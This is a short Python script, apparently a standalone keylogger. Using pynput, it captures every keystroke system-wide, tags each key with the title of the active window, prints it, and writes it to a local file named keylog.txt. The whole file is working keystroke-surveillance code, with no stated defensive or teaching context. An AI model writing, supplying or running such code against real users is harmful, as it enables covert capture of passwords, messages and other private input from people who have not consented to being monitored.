from pynput import keyboard
import logging
import pywinctl as pwc
logging.basicConfig(
    filename="keylog.txt",
    level=logging.DEBUG,
    format="[%(asctime)s]:%(message)s"
)
def get_active_app():
    try:
        active_window = pwc.getActiveWindow()
        if active_window:
            return active_window.title
        return "Unknown Application"
    except Exception:
        return "Unknown Application"
def on_press(key):
    try:
        app_name = get_active_app()
        print(str(f"App:{app_name} | Key:{key.char}"))
        logging.info(str(f"App:{app_name} | Key:{key.char}"))
    except AttributeError:
        app_name = get_active_app()
        print(str(f"App:{app_name} | Key:{key}"))
        logging.info(str(f"App:{app_name} | Key:{key}"))


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    